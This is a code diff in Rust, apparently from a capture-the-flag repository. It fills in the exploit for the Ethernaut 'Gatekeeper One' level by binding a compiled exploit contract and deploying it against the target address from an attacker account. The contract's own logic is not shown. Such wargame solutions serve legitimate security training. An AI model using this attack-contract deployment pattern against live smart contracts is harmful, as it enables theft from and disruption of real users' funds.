@@ -11,6 +11,12 @@ use ctf::ethereum::ethernaut::lvl13_gatekeeper_one::*;
 
 pub struct Exploit;
 
+alloy::sol!(
+    #[sol(rpc)]
+    GatekeeperOneExploit,
+    "out/GatekeeperOneExploit.sol/GatekeeperOneExploit.json"
+);
+
 #[async_trait]
 impl ctf::Exploit for Exploit {
     type Target = Target;
@@ -20,8 +26,15 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &Actor,
     ) -> eyre::Result<()> {
-        // TODO: exploit the level
-        let _ = (target, offender);
+        GatekeeperOneExploit::deploy_builder(
+            offender.provider(),
+            target.address,
+        )
+        .gas(1_000_000)
+        .from(offender.address())
+        .deploy()
+        .await?;
+
         Ok(())
     }
 }
